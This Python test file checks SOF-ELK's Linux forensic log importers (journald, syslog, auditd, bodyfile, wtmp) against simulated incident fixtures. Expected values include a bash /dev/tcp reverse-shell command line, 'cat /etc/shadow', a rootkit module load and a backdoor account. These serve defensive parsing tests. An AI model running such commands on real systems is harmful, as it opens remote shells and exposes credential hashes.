#!/usr/bin/env python3
"""Tests for the Linux importers (standard library only, no Elasticsearch needed).

    python3 Linux/tests/test_linux_importers.py -v

Fixtures (Linux/tests/fixtures/):
  rhel-root/   a collected root filesystem that is not UAC (Rocky 9): secure with a December ->
               January rollover, a dated and (in the test) gzip/xz-rotated messages file,
               firewalld, America/New_York /etc/localtime
  uac-ubuntu/  a UAC folder (Ubuntu 24.04): ISO 8601 auth.log and syslog (with RFC 5424 and UFW
               lines) and a journalctl -o json export with byte-array and repeated fields
  uac-nojson/  a UAC folder with binary journal files but no JSON export
Phase 2 adds to them: rhel-root/var/log/audit/ (raw and ENRICHED audit records, interleaved,
hex-encoded and split arguments, rotation), uac-ubuntu/bodyfile/ + hash_executables/ (UAC
bodyfile with setuid, hidden, /dev, symlink, socket and "|"-in-name entries), and wtmp, btmp
and wtmpdb files that the tests build in a temporary copy of rhel-root.
Every document is checked against its index template: a field the template does not map
would be silently dropped by Elasticsearch (the indexes use dynamic: false).
"""
import datetime as dt
import gzip
import lzma
import os
import shutil
import sys
import tempfile
import types
import unittest
import zipfile
from pathlib import Path

HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))
sys.path.insert(0, str(HERE.parent / "common"))

import auditd2sofelk  # noqa: E402
import bodyfile2sofelk  # noqa: E402
import journal2sofelk  # noqa: E402
import sof_elk_linux_common as common  # noqa: E402
import syslog2sofelk  # noqa: E402
import wtmp2sofelk  # noqa: E402
from sof_elk_linux_messages import enrich  # noqa: E402

FIXTURES = HERE / "fixtures"


def args(**kw):
    base = dict(journal_json=None, syslog_file=None, year=None, case=None, bodyfile=None, wtmp_file=None,
                audit_log=None)
    base.update(kw)
    return types.SimpleNamespace(**base)


def run(source, evidence, hostname=None, local_tz=None, **kw):
    ev = common.Evidence(evidence)
    profile = common.HostProfile(ev, hostname, local_tz)
    a = args(**kw)
    syslog2sofelk.parse.seen = {}
    report = common.Report()
    docs, skipped = [], []
    for item in source.collect(ev, profile, a) or []:
        for parts, doc in source.parse(ev, profile, a, item, report):
            if parts is None:
                skipped.append(doc)
            else:
                docs.append((parts, doc))
    return ev, profile, docs, skipped, report


def by_message(docs, text):
    return next(d for _, d in docs if text in (d.get("message") or ""))


class TemplateCheck(unittest.TestCase):
    def assert_mapped(self, docs, prefix="logstash"):
        _, _, body = common.load_templates(prefix)
        exact = common.template_fields(body["mappings"])
        for _, doc in docs:
            self.assertEqual(common.unknown_fields(doc, exact), [], doc)


class EvidenceTests(unittest.TestCase):
    def test_uac_folder_profile(self):
        ev = common.Evidence(FIXTURES / "uac-ubuntu")
        self.assertTrue(ev.is_uac)
        self.assertEqual(ev.root, "[root]")
        p = common.HostProfile(ev)
        self.assertEqual(p.hostname, "web01")
        self.assertEqual(p.os["family"], "debian")
        self.assertEqual(p.os["version"], "24.04")
        self.assertEqual(p.os["kernel"], "6.8.0-45-generic")

    def test_plain_root_profile(self):
        ev = common.Evidence(FIXTURES / "rhel-root")
        self.assertFalse(ev.is_uac)
        p = common.HostProfile(ev)
        self.assertEqual((p.hostname, p.os["family"], p.os["platform"]), ("web02", "redhat", "rocky"))
        self.assertEqual(p.host_id, "0123456789abcdef0123456789abcdef")
        # America/New_York read from the evidence's /etc/localtime (TZif), not this machine.
        self.assertEqual(dt.datetime(2026, 7, 1, tzinfo=p.tz).utcoffset(), dt.timedelta(hours=-4))
        self.assertEqual(dt.datetime(2026, 1, 1, tzinfo=p.tz).utcoffset(), dt.timedelta(hours=-5))

    def test_root_found_one_level_down_and_hostname_override(self):
        with tempfile.TemporaryDirectory() as tmp:
            shutil.copytree(FIXTURES / "rhel-root", Path(tmp) / "uploads" / "rootfs")
            ev = common.Evidence(tmp)
            self.assertEqual(ev.root, "uploads/rootfs")
            p = common.HostProfile(ev, "WEB 02-B")
            self.assertEqual(p.hostname, "web-02-b")
            self.assertTrue(any("differs" in n for n in p.notes))

    def test_zip_is_read_in_place(self):
        with tempfile.TemporaryDirectory() as tmp:
            z = Path(tmp) / "uac-web01.zip"
            with zipfile.ZipFile(z, "w", zipfile.ZIP_DEFLATED) as zf:
                for f in (FIXTURES / "uac-ubuntu").rglob("*"):
                    if f.is_file():
                        zf.write(f, f.relative_to(FIXTURES / "uac-ubuntu").as_posix())
            ev, profile, docs, _, _ = run(journal2sofelk.JOURNAL, z)
            self.assertEqual(profile.hostname, "web01")
            self.assertEqual(len(docs), 2)
            _, _, sdocs, _, _ = run(syslog2sofelk.SYSLOG, z)
            self.assertEqual(len(sdocs), 8)


class JournalTests(TemplateCheck):
    def setUp(self):
        self.ev, self.profile, self.docs, self.skipped, self.report = run(
            journal2sofelk.JOURNAL, FIXTURES / "uac-ubuntu")

    def test_fields(self):
        self.assertEqual(len(self.docs), 2)
        self.assertEqual(sorted(self.skipped), ["entry without a valid __REALTIME_TIMESTAMP",
                                                "line is not JSON (is this a journalctl -o json export?)"])
        parts, d = self.docs[0]
        self.assertEqual(parts, ["journal", "s=aa;i=1;b=bb;m=1;t=1;x=1"])
        self.assertEqual(d["@timestamp"], "2026-10-31T10:00:00.000000Z")
        self.assertEqual(d["log"]["syslog"]["appname"], "sshd")
        self.assertEqual(d["log"]["syslog"]["facility"], {"code": 10, "name": "security/authorization"})
        self.assertEqual(d["log"]["syslog"]["priority"], 86)
        self.assertEqual(d["event"]["dataset"], "syslog.journal")
        self.assertEqual(d["journald"]["unit"], "ssh.service")
        self.assertEqual((d["user"]["name"], d["source"]["ip"], d["ssh"]["auth_result"]),
                         ("carol", "192.0.2.10", "accepted"))
        self.assertEqual(d["process"]["user"]["id"], "0")
        self.assertNotIn("extra", d["journald"])  # SYSLOG_TIMESTAMP is dropped
        self.assert_mapped(self.docs)

    def test_binary_and_repeated_values(self):
        d = self.docs[1][1]
        self.assertEqual(d["message"], "hi�\nthere")
        self.assertEqual(d["journald"]["extra"], ["CUSTOM_FIELD=one\ntwo"])

    def test_machine_id_mismatch_warns(self):
        with tempfile.TemporaryDirectory() as tmp:
            shutil.copytree(FIXTURES / "uac-ubuntu", Path(tmp) / "c")
            (Path(tmp) / "c" / "[root]" / "etc" / "machine-id").write_text("0" * 32 + "\n")
            _, _, _, _, report = run(journal2sofelk.JOURNAL, Path(tmp) / "c")
            self.assertTrue(any("_MACHINE_ID" in w for w in report.warnings))

    def test_missing_export_explains_journalctl(self):
        ev = common.Evidence(FIXTURES / "uac-nojson")
        profile = common.HostProfile(ev)
        self.assertEqual(journal2sofelk.collect(ev, profile, args()), [])
        code, message = journal2sofelk.missing(ev, profile, args())
        self.assertEqual(code, 3)
        self.assertIn("journalctl --directory=", message)
        self.assertIn("[root]/var/log/journal/0123456789abcdef0123456789abcdef", message)
        self.assertIn("mkdir -p", message)
        code, message = journal2sofelk.missing(common.Evidence(FIXTURES / "rhel-root"), profile, args())
        self.assertEqual(code, 0)

    def test_journal_json_option(self):
        export = FIXTURES / "uac-ubuntu" / "journal" / "journalctl_full_journal_logs.json"
        with tempfile.TemporaryDirectory() as tmp:
            gz = Path(tmp) / "export.json.gz"
            gz.write_bytes(gzip.compress(export.read_bytes()))
            _, profile, docs, _, _ = run(journal2sofelk.JOURNAL, FIXTURES / "uac-nojson", journal_json=[str(gz)])
            self.assertEqual((len(docs), profile.hostname), (2, "db01"))


class SyslogTests(TemplateCheck):
    def rhel(self):
        """rhel-root copied with fixed mtimes, plus gzip and xz rotated copies of messages."""
        tmp = tempfile.TemporaryDirectory()
        root = Path(tmp.name) / "r"
        shutil.copytree(FIXTURES / "rhel-root", root)
        log = root / "var" / "log"
        stamp = dt.datetime(2026, 1, 3, 12, 0).timestamp()
        os.utime(log / "secure", (stamp, stamp))
        data = (log / "messages-20261025").read_bytes()
        (log / "messages-20261018.gz").write_bytes(gzip.compress(data.replace(b"Oct 24", b"Oct 17")))
        (log / "messages-20261011.xz").write_bytes(lzma.compress(data.replace(b"Oct 24", b"Oct 10")))
        for f in log.glob("messages*"):
            s = dt.datetime(2026, 10, 25, 3, 0).timestamp()
            os.utime(f, (s, s))
        self.addCleanup(tmp.cleanup)
        return root

    def test_rfc3164_year_rollover_and_local_time(self):
        _, profile, docs, skipped, report = run(syslog2sofelk.SYSLOG, self.rhel())
        secure = [d for _, d in docs if d["log"]["file"]["path"].endswith("secure")]
        self.assertEqual(len(secure), 10)
        # Dec 30 23:59:01 EST (UTC-5) in 2025, Jan 2 in 2026 (file mtime 2026-01-03)
        self.assertEqual(secure[0]["@timestamp"], "2025-12-31T04:59:01.000000Z")
        self.assertEqual(secure[3]["@timestamp"], "2026-01-02T15:15:42.000000Z")
        self.assertEqual(secure[0]["event"]["timezone"], "evidence /etc/localtime")
        self.assertTrue(report.warnings)
        self.assert_mapped(docs)

    def test_year_option(self):
        _, _, docs, _, _ = run(syslog2sofelk.SYSLOG, self.rhel(), year=2024)
        secure = [d for _, d in docs if d["log"]["file"]["path"].endswith("secure")]
        self.assertTrue(secure[0]["@timestamp"].startswith("2023-12-31"))

    def test_rhel_messages(self):
        _, _, docs, _, _ = run(syslog2sofelk.SYSLOG, self.rhel(), local_tz="+00:00")
        paths = sorted({d["log"]["file"]["path"] for _, d in docs})
        self.assertEqual(paths, ["var/log/firewalld", "var/log/messages-20261011.xz",
                                 "var/log/messages-20261018.gz", "var/log/messages-20261025", "var/log/secure"])
        tb = by_message(docs, "Traceback")
        self.assertIn('File "/opt/app/run.py"', tb["message"])  # continuation line kept
        fw = [d for _, d in docs if d.get("tags") and "got_iptables" in d["tags"]][0]
        self.assertEqual((fw["source"]["ip"], fw["destination"]["port"], fw["network"]["transport"]),
                         ("203.0.113.7", 22, "tcp"))
        self.assertEqual(fw["host"]["uptime"], 1234.56789)
        self.assertEqual(fw["source"]["mac"], "00-50-56-DD-EE-FF")
        self.assertIn("kernel_module", by_message(docs, "module verification failed")["tags"])
        cron = by_message(docs, "backup.sh")
        self.assertEqual((cron["event"]["action"], cron["user"]["name"]), ("cron-command", "root"))
        fwd = by_message(docs, "COMMAND_FAILED")
        self.assertEqual((fwd["log"]["syslog"]["appname"], fwd["@timestamp"]),
                         ("firewalld", "2026-10-24T03:15:00.000000Z"))

    def test_auth_events(self):
        _, _, docs, _, _ = run(syslog2sofelk.SYSLOG, self.rhel(), local_tz="UTC")
        sudo_fail = by_message(docs, "incorrect password")
        self.assertEqual((sudo_fail["event"]["outcome"], sudo_fail["sudo"]["result"],
                          sudo_fail["process"]["command_line"]),
                         ("failure", "3 incorrect password attempts", "/bin/cat /etc/shadow"))
        login = by_message(docs, "Accepted publickey")
        self.assertEqual((login["ssh"]["key_type"], login["ssh"]["login_method"]), ("ED25519", "publickey"))
        user = by_message(docs, "new user: name=bob")
        self.assertEqual((user["event"]["action"], user["user"]["target"]["name"], user["account"]["shell"]),
                         ("user-created", "bob", "/bin/bash"))
        grp = by_message(docs, "to group 'wheel'")
        self.assertEqual((grp["event"]["action"], grp["group"]["name"]), ("group-membership-added", "wheel"))
        su = by_message(docs, "FAILED SU")
        self.assertEqual((su["event"]["outcome"], su["user"]["name"], su["user"]["effective"]["name"]),
                         ("failure", "bob", "root"))
        bad = by_message(docs, "Failed password")
        self.assertEqual((bad["ssh"]["user_validity"], bad["user"]["name"]), ("invalid", "admin"))

    def test_rotated_copy_does_not_duplicate(self):
        root = self.rhel()
        log = root / "var" / "log"
        shutil.copy(log / "secure", log / "secure-20260101")
        _, _, docs, _, _ = run(syslog2sofelk.SYSLOG, root)
        ids = [common.doc_id("logstash", "web02", *p) for p, _ in docs]
        self.assertEqual(len(docs), 23 + 10)
        # the same line in two files of one family is two documents (occurrence count)
        self.assertEqual(len(set(ids)), len(ids))

    def test_ubuntu_iso_rfc5424_ufw(self):
        _, _, docs, _, _ = run(syslog2sofelk.SYSLOG, FIXTURES / "uac-ubuntu")
        self.assertEqual(len(docs), 8)
        ufw = by_message(docs, "UFW BLOCK")
        self.assertEqual((ufw["iptables"]["label"], ufw["event"]["action"], ufw["destination"]["port"]),
                         ("UFW BLOCK", "firewall-block", 3389))
        app = by_message(docs, "Application event")
        self.assertEqual((app["log"]["syslog"]["appname"], app["log"]["syslog"]["msgid"],
                          app["log"]["syslog"]["severity"]["name"], app["@timestamp"]),
                         ("myapp", "ID47", "Informational", "2026-10-30T22:11:00.000000Z"))
        neg = by_message(docs, "Unable to negotiate")
        self.assertEqual(neg["ssh"]["source_kex_methods"], ["diffie-hellman-group1-sha1",
                                                            "diffie-hellman-group14-sha1"])
        fail = by_message(docs, "authentication failure")
        self.assertEqual((fail["pam"]["event"], fail["user"]["target"]["name"], fail["event"]["outcome"]),
                         ("authentication_failure", "carol", "failure"))
        pk = by_message(docs, "Executing command")
        self.assertEqual((pk["user"]["name"], pk["process"]["command_line"]), ("carol", "/usr/bin/bash"))
        self.assertNotIn("timezone", ufw["event"])  # ISO time with an offset: no local time used
        self.assert_mapped(docs)


class AuditdTests(TemplateCheck):
    def setUp(self):
        _, _, self.docs, self.skipped, _ = run(auditd2sofelk.AUDITD, FIXTURES / "rhel-root")
        self.by_seq = {d["auditd"]["sequence"]: d for _, d in self.docs}

    def test_events_grouped(self):
        self.assertEqual(len(self.docs), 10)
        self.assertEqual(self.skipped, ["line that is not an audit record"])
        # rotated file first
        self.assertEqual(self.docs[0][1]["log"]["file"]["path"], "var/log/audit/audit.log.1")
        ex = self.by_seq[1010]
        self.assertEqual(ex["auditd"]["record_types"], ["CWD", "EXECVE", "PATH", "PROCTITLE", "SYSCALL"])
        self.assertEqual(ex["message"].count("\n"), 5)  # 6 raw records, EOE included
        self.assert_mapped(self.docs, "auditd")

    def test_execve(self):
        ex = self.by_seq[1010]
        self.assertEqual(ex["process"]["command_line"], "bash -c bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")
        self.assertEqual(ex["process"]["args"][2], "bash -i >& /dev/tcp/198.51.100.7/4444 0>&1")
        self.assertEqual((ex["event"]["action"], ex["auditd"]["data"]["syscall"], ex["auditd"]["key"]),
                         ("executed", "execve", ["exec"]))
        self.assertEqual((ex["user"]["name"], ex["user"]["audit"]["name"], ex["process"]["working_directory"]),
                         ("alice", "alice", "/tmp"))
        self.assertEqual((ex["file"]["path"], ex["file"]["mode"], ex["file"]["owner"]),
                         ("/usr/bin/bash", "0755", "root"))
        split = self.by_seq[1020]
        self.assertEqual(split["process"]["args"], ["echo", "-n", "helloworld"])
        self.assertEqual(split["file"]["path"], "/etc/cron.d/evil")  # relative name joined with CWD
        self.assertNotIn("key", split["auditd"])  # key=(null)
        self.assertNotIn("session", split["auditd"])  # ses=4294967295

    def test_raw_syscall_args_not_hex_decoded(self):
        self.assertEqual(self.by_seq[1012]["auditd"]["data"]["a2"], "10")

    def test_connect_and_module(self):
        c = self.by_seq[1012]
        self.assertEqual((c["destination"]["ip"], c["destination"]["port"], c["event"]["outcome"]),
                         ("198.51.100.7", 4444, "failure"))
        mod = self.by_seq[900]
        self.assertEqual((mod["event"]["action"], mod["auditd"]["data"]["name"], mod["process"]["title"]),
                         ("loaded-kernel-module", "diamorphine", "insmod diamorphine.ko"))
        self.assertEqual(mod["user"]["audit"]["name"], "alice")  # resolved from /etc/passwd

    def test_logins_and_accounts(self):
        failed = self.by_seq[1001]
        self.assertEqual((failed["user"]["name"], failed["source"]["ip"], failed["event"]["outcome"],
                          failed["process"]["user"]["id"]), ("admin", "203.0.113.50", "failure", "0"))
        self.assertNotIn("audit", failed["user"])  # auid unset
        ok = self.by_seq[1002]
        self.assertEqual((ok["user"]["name"], ok["event"]["action"]), ("alice", "logged-in"))
        add = self.by_seq[880]
        self.assertEqual((add["event"]["action"], add["user"]["target"]["name"], add["user"]["target"]["id"]),
                         ("added-user-account", "backdoor", "1002"))
        self.assertNotIn("source", add)  # hostname= of a local command is not a remote host
        sudo = self.by_seq[1011]
        self.assertEqual((sudo["process"]["command_line"], sudo["event"]["action"]),
                         ("cat /etc/shadow", "ran-command"))
        svc = self.by_seq[1030]
        self.assertEqual((svc["auditd"]["node"], svc["auditd"]["data"]["unit"]), ("web02", "evil-backdoor"))

    def test_ids_stable_across_rotation(self):
        root_tmp = tempfile.TemporaryDirectory()
        self.addCleanup(root_tmp.cleanup)
        root = Path(root_tmp.name) / "r"
        shutil.copytree(FIXTURES / "rhel-root", root)
        audit = root / "var" / "log" / "audit"
        (audit / "audit.log.2.gz").write_bytes(gzip.compress((audit / "audit.log.1").read_bytes()))
        _, _, docs, _, _ = run(auditd2sofelk.AUDITD, root)
        ids = [common.doc_id("auditd", "web02", *p) for p, _ in docs]
        self.assertEqual(len(docs), 13)
        self.assertEqual(len(set(ids)), 10)  # the copy overwrites instead of duplicating


class BodyfileTests(TemplateCheck):
    def test_uac_bodyfile(self):
        _, _, docs, skipped, _ = run(bodyfile2sofelk.BODYFILE, FIXTURES / "uac-ubuntu")
        self.assertEqual(len(docs), 8)
        self.assertEqual(skipped, ["line is not in bodyfile format (11 fields)"])
        by_path = {d["file"]["path"]: d for _, d in docs}
        sudo = by_path["/usr/bin/sudo"]
        self.assertEqual((sudo["file"]["mode"], sudo["bodyfile"]["setuid"], sudo["file"]["hash"]["md5"],
                          sudo["@timestamp"]), ("4755", True, "0123456789abcdef0123456789abcdef",
                                                "2023-11-14T22:13:20.000000Z"))
        payload = by_path["/tmp/.x/payload.elf"]
        self.assertEqual((payload["file"]["owner"], payload["bodyfile"]["world_writable"],
                          payload["bodyfile"]["executable"], payload["file"]["hash"]["sha1"]),
                         ("carol", True, True, "0123456789abcdef0123456789abcdef01234567"))
        dev = by_path["/dev/shm/.cache"]
        self.assertTrue(dev["bodyfile"]["regular_file_in_dev"] and dev["bodyfile"]["hidden"])
        self.assertNotIn("created", dev["file"])  # crtime 0
        self.assertIn("/home/carol/notes|weird.txt", by_path)
        link = by_path["/usr/lib64"]
        self.assertEqual((link["file"]["type"], link["file"]["target_path"]), ("symlink", "lib"))
        self.assertEqual(by_path["/tmp"]["file"]["mode"], "1777")
        self.assertTrue(by_path["/tmp"]["bodyfile"]["sticky"])
        self.assertEqual(by_path["/run/systemd/notify"]["file"]["type"], "socket")
        self.assert_mapped(docs, "bodyfile")

    def test_tsk_bodyfile_from_disk(self):
        with tempfile.TemporaryDirectory() as tmp:
            body = Path(tmp) / "image.body.gz"
            body.write_bytes(gzip.compress(
                b"0|/home/eve/secret.doc (deleted)|1234-128-1|r/rrw-r--r--|1002|1002|4096|1793000000|1793000001"
                b"|1793000002|1793000003\n"
                b"d41d8cd98f00b204e9800998ecf8427e|/etc/ld.so.preload|88|r/rrw-r--r--|0|0|20|1793000010"
                b"|1793000011|1793000012|0\n"))
            _, _, docs, _, _ = run(bodyfile2sofelk.BODYFILE, FIXTURES / "rhel-root", bodyfile=[str(body)])
        self.assertEqual(len(docs), 2)
        deleted, preload = docs[0][1], docs[1][1]
        self.assertEqual((deleted["file"]["path"], deleted["bodyfile"]["deleted"], deleted["file"]["inode"],
                          deleted["file"]["type"]), ("/home/eve/secret.doc", True, "1234-128-1", "file"))
        self.assertEqual(preload["file"]["hash"]["md5"], "d41d8cd98f00b204e9800998ecf8427e")
        self.assertEqual(preload["file"]["owner"], "root")  # from rhel-root/etc/passwd
        self.assert_mapped(docs, "bodyfile")


def utmp_record(utype, pid, line, user, host, sec, usec=0, addr=b"", ut_id=b""):
    return __import__("struct").pack(
        "<" + wtmp2sofelk.UTMP_FMT, utype, pid, line.encode(), ut_id or line[-4:].encode(), user.encode(),
        host.encode(), 0, 0, 0, sec, usec, addr.ljust(16, b"\0"), b"")


class WtmpTests(TemplateCheck):
    T0 = 1767225600  # 2026-01-01T00:00:00Z

    def build(self, root):
        log = root / "var" / "log"
        t = self.T0
        old = [utmp_record(2, 0, "~", "reboot", "5.14.0", t, 0, ut_id=b"~~"),
               utmp_record(7, 900, "pts/0", "alice", "10.0.0.5", t + 60, 5, bytes([10, 0, 0, 5]))]
        cur = [utmp_record(8, 900, "pts/0", "", "", t + 3660),                       # logout of the rotated login
               utmp_record(6, 1000, "tty1", "LOGIN", "", t + 3700),                   # getty
               utmp_record(8, 1000, "tty1", "", "", t + 3710),                        # getty ends: not a logout
               utmp_record(7, 1100, "pts/1", "root", "203.0.113.9", t + 4000),
               utmp_record(7, 1200, ":0", "carol", ":0", t + 4100),
               utmp_record(1, ord("0"), "~", "shutdown", "5.14.0", t + 5000, ut_id=b"~~"),
               utmp_record(2, 0, "~", "reboot", "5.14.0", t + 6000, ut_id=b"~~"),
               utmp_record(1, ord("3") | (ord("N") << 8), "~", "runlevel", "5.14.0", t + 6005, ut_id=b"~~"),
               utmp_record(7, 1300, "pts/2", "alice", "2001:db8::7", t + 6100),
               utmp_record(2, 0, "~", "reboot", "5.14.0", t + 7000, ut_id=b"~~")]     # crash: no shutdown
        (log / "wtmp.1").write_bytes(b"".join(old))
        (log / "wtmp").write_bytes(b"".join(cur))
        (log / "btmp").write_bytes(utmp_record(6, 1400, "ssh:notty", "admin", "198.51.100.3", t + 4200))
        db = root / "var" / "lib" / "wtmpdb"
        db.mkdir(parents=True)
        import sqlite3
        con = sqlite3.connect(db / "wtmp.db")
        con.execute("CREATE TABLE wtmp(ID INTEGER PRIMARY KEY, Type INTEGER, User TEXT NOT NULL, Login INTEGER,"
                    " Logout INTEGER, TTY TEXT, RemoteHost TEXT, Service TEXT) STRICT")
        us = 10 ** 6
        con.executemany("INSERT INTO wtmp VALUES (?,?,?,?,?,?,?,?)", [
            (1, 1, "reboot", t * us, (t + 900) * us, "~", "6.4.0-default", None),
            (2, 3, "bob", (t + 100) * us + 250, (t + 400) * us, "pts/3", "192.0.2.44", "sshd"),
            (3, 3, "bob", (t + 500) * us, None, "pts/4", None, "systemd-user")])
        con.commit()
        con.close()

    def setUp(self):
        tmp = tempfile.TemporaryDirectory()
        self.addCleanup(tmp.cleanup)
        self.root = Path(tmp.name) / "r"
        shutil.copytree(FIXTURES / "rhel-root", self.root)
        self.build(self.root)
        _, _, self.docs, self.skipped, self.report = run(wtmp2sofelk.WTMP, self.root)
        self.ds = [d for _, d in self.docs]

    def find(self, source, action, **match):
        for d in self.ds:
            if d["wtmp"]["source"] == source and d["event"]["action"] == action and all(
                    common.get_field(d, k.replace("__", ".")) == v for k, v in match.items()):
                return d
        raise AssertionError(f"no {source} {action} {match}")

    def test_counts_and_mapping(self):
        self.assertEqual(len(self.docs), 12 + 1 + 5)
        self.assertEqual(self.skipped, [])
        self.assert_mapped(self.docs, "wtmp")

    def test_pairing_across_rotation(self):
        login = self.find("wtmp", "login", user__name="alice", wtmp__line="pts/0")
        self.assertEqual((login["event"]["end"], login["event"]["duration"], login["wtmp"]["logout_type"]),
                         ("2026-01-01T01:01:00.000000Z", 3599999995000, "logout"))
        self.assertEqual((login["source"]["ip"], login["@timestamp"]), ("10.0.0.5", "2026-01-01T00:01:00.000005Z"))
        logout = self.find("wtmp", "logout")
        self.assertEqual((logout["user"]["name"], logout["source"]["ip"]), ("alice", "10.0.0.5"))
        self.find("wtmp", "process-ended", wtmp__line="tty1")
        logouts = [d for d in self.ds if d["event"]["action"] == "logout" and d["wtmp"]["source"] == "wtmp"]
        self.assertEqual(len(logouts), 1)

    def test_shutdown_crash_and_display(self):
        root = self.find("wtmp", "login", user__name="root")
        self.assertEqual((root["wtmp"]["logout_type"], root["source"]["address"]), ("shutdown", "203.0.113.9"))
        x = self.find("wtmp", "login", user__name="carol")
        self.assertNotIn("source", x)  # X display, not a remote host
        self.assertEqual(x["wtmp"]["host"], ":0")
        v6 = self.find("wtmp", "login", user__name="alice", wtmp__line="pts/2")
        self.assertEqual((v6["wtmp"]["logout_type"], v6["source"]["ip"]), ("crash", "2001:db8::7"))
        rl = self.find("wtmp", "runlevel-change")
        self.assertEqual((rl["wtmp"]["runlevel"], rl["wtmp"]["previous_runlevel"]), ("3", "N"))
        self.find("wtmp", "shutdown")

    def test_btmp(self):
        bad = self.find("btmp", "failed-login")
        self.assertEqual((bad["user"]["name"], bad["source"]["ip"], bad["event"]["outcome"]),
                         ("admin", "198.51.100.3", "failure"))

    def test_wtmpdb(self):
        login = self.find("wtmpdb", "login", wtmp__line="pts/3")
        self.assertEqual((login["user"]["name"], login["source"]["ip"], login["wtmp"]["service"],
                          login["@timestamp"], login["event"]["duration"]),
                         ("bob", "192.0.2.44", "sshd", "2026-01-01T00:01:40.000250Z", 299999750000))
        logout = self.find("wtmpdb", "logout")
        self.assertEqual((logout["user"]["name"], logout["@timestamp"]), ("bob", "2026-01-01T00:06:40.000000Z"))
        self.find("wtmpdb", "boot")
        self.find("wtmpdb", "shutdown")
        still = self.find("wtmpdb", "login", wtmp__line="pts/4")
        self.assertNotIn("end", still["event"])

    def test_ids_unique_and_stable(self):
        ids = [common.doc_id("wtmp", "web02", *p) for p, _ in self.docs]
        self.assertEqual(len(set(ids)), len(ids))
        # The same record found again under a new rotated name keeps its _id.
        log = self.root / "var" / "log"
        shutil.copy(log / "wtmp.1", log / "wtmp-20251201")
        (log / "wtmp.1").unlink()
        _, _, again, _, _ = run(wtmp2sofelk.WTMP, self.root)
        self.assertEqual(set(common.doc_id("wtmp", "web02", *p) for p, _ in again), set(ids))


class LinuxFrontEndTests(unittest.TestCase):
    def test_sources_registered(self):
        import linux2sofelk
        self.assertEqual([s.name for s in linux2sofelk.SOURCES],
                         ["journal", "syslog", "auditd", "bodyfile", "wtmp", "packages", "linuxconfig",
                          "httpd", "browser", "vsftpd"])
        for s in linux2sofelk.SOURCES:
            common.load_templates(s.prefix, s.templates)  # every source has its template
        self.assertEqual([s.index_template for s in linux2sofelk.SOURCES], [False, False, True, True, True, True, True, False, True, False])


class MessageTests(unittest.TestCase):
    def test_pam_old_and_new_session_format(self):
        new, old = {}, {}
        enrich(new, "sudo", "pam_unix(sudo:session): session opened for user root(uid=0) by kali(uid=1000)")
        enrich(old, "su", "pam_unix(su:session): session opened for user root by (uid=1000)")
        self.assertEqual((new["user"]["name"], new["user"]["id"], new["pam"]["by_user"]), ("root", "0", "kali"))
        self.assertEqual((old["user"]["name"], old["user"]["id"]), ("root", "1000"))

    def test_unrelated_message_untouched(self):
        doc = {}
        self.assertFalse(enrich(doc, "NetworkManager", "device (eth0): state change"))
        self.assertEqual(doc, {})


class WrapperDiscoveryTests(unittest.TestCase):
    """SOF-ELK_ImportWrapper.py hands UAC collections to linux2sofelk.py and skips their files."""

    def test_uac_folder_and_zip_are_found_and_pruned(self):
        import importlib.util
        spec = importlib.util.spec_from_file_location(
            "wrapper", HERE.parent.parent / "SOF-ELK_ImportWrapper.py")
        wrapper = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(wrapper)
        with tempfile.TemporaryDirectory() as tmp:
            root = Path(tmp)
            shutil.copytree(FIXTURES / "uac-ubuntu", root / "case" / "uac-ubuntu")
            # A CSV inside the collection's [root] must not reach the Windows importers.
            stray = root / "case" / "uac-ubuntu" / "[root]" / "tmp" / "20260101_EvtxECmd_Output.csv"
            stray.parent.mkdir(parents=True)
            stray.write_text("TimeCreated,EventId\n")
            with zipfile.ZipFile(root / "uac-db01.zip", "w") as zf:
                zf.writestr("uac.log", "Hostname: db01\n")
                zf.writestr("[root]/etc/hostname", "db01\n")
            with zipfile.ZipFile(root / "other.zip", "w") as zf:
                zf.writestr("notes.txt", "x")
            json_files, csv_files, linux = wrapper.discover(root)
            self.assertEqual(sorted(p.name for p in linux), ["uac-db01.zip", "uac-ubuntu"])
            self.assertFalse(any(csv_files.values()))
            self.assertFalse(any(json_files.values()))


if __name__ == "__main__":
    unittest.main()
